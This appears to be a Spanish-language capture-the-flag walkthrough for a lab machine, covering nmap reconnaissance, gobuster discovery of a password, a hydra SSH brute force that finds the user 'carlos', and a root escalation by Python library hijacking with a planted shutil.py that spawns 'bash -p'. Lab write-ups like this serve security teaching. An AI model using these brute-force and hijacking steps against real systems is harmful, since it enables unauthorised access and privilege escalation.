## 1. Reconocimiento Inicial con Nmap

El primer paso en cualquier evaluación de seguridad es el reconocimiento de la red y los servicios expuestos.

```bash
nmap -sC -sV -O <IP_DEL_OBJETIVO>
```

### Resultado del Escaneo Nmap

- `22/tcp open ssh OpenSSH 9.6p1 Ubuntu 3ubuntu13`.
- `80/tcp open http Apache httpd 2.4.58 ((Ubuntu))`.

## 2. Enumeración de Contenido Web

Dado que la raíz del servicio web solo expone la página por defecto, realizamos una enumeración de directorios y archivos para descubrir contenido oculto.

```Bash
gobuster dir -u http://<IP_DEL_OBJETIVO>/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
```

**Salida Relevante:**

- `/index.html`: Página principal por defecto.
- `/index.php`
- `/javascript`
- `/.html` y `/server-status`: Rutas con acceso denegado (403).

Al acceder al recurso `http://<IP_DEL_OBJETIVO>/index.php`, obtenemos el siguiente contenido: `JIFGHDS87GYDFIGD`

Esta cadena es muy probable que sea una credencial o una clave. 

## 3. Acceso Inicial (SSH)

Con una contraseña potencial pero sin un nombre de usuario válido, realizamos un ataque de fuerza bruta contra el servicio SSH, fijando la contraseña y probando un diccionario extenso de usuarios.

```Bash
hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -p JIFGHDS87GYDFIGD ssh://<IP_DEL_OBJETIVO> -t 4
```

**Resultado Exitoso:** La herramienta logra emparejar la credencial, revelando la existencia del usuario **carlos**.

Establecemos la conexión SSH:

```Bash
ssh carlos@<IP_DEL_OBJETIVO>
# Password: JIFGHDS87GYDFIGD
```

El acceso a la consola de bajos privilegios es exitoso.

## 4. Escalada de Privilegios

El siguiente objetivo es elevar nuestros privilegios hasta comprometer la cuenta `root`.

### 4.1. Verificación de Permisos de Sudo

Verificamos qué comandos están autorizados para el usuario `carlos` mediante `sudo`.

```Bash
sudo -l
```

**Salida:**

```
(ALL) NOPASSWD: /usr/bin/python3 /opt/script.py
```

El usuario puede invocar el intérprete de Python 3 para ejecutar `/opt/script.py` con permisos administrativos sin proporcionar contraseña.

### 4.2. Análisis del Script Python

Analizamos el contenido del archivo objetivo:

```Bash
cat /opt/script.py
```

```Python
import shutil  

def copiar_archivo(origen, destino):  
   shutil.copy(origen, destino)  
   print(f'Archivo copiado de {origen} a {destino}')  

if __name__ == '__main__':  
   origen = '/opt/script.py'  
   destino = '/tmp/script_backup.py'  
   copiar_archivo(origen, destino)
```

El script utiliza la librería estándar `shutil` para realizar una copia de seguridad de sí mismo. Cuando Python importa un módulo, evalúa un orden de precedencia (conocido como `sys.path`). Si encuentra un archivo con el nombre del módulo en el directorio de ejecución antes que en las rutas del sistema, lo cargará de forma preferente.

Este comportamiento origina una vulnerabilidad crítica conocida como **Python Library Hijacking** (secuestro de librerías).

### 4.3. Explotación (Library Hijacking)

Asumiendo que el entorno del CTF permite la escritura en el directorio `/opt` (o maniobrando desde un directorio con prioridad en el `PYTHONPATH`), procedemos a forjar nuestro propio módulo malicioso `shutil.py`.

```Bash
cd /opt
echo -e "import os\nos.system(\"bash -p\")" > shutil.py
```

Ejecutamos el comando autorizado por `sudoers`. Al iniciar, Python intentará importar `shutil` y cargará nuestro archivo local en su lugar, detonando el código malicioso con privilegios de superusuario.

```Bash
sudo /usr/bin/python3 /opt/script.py
```

Verificamos el éxito de la operación:

```Bash
whoami
# root
```
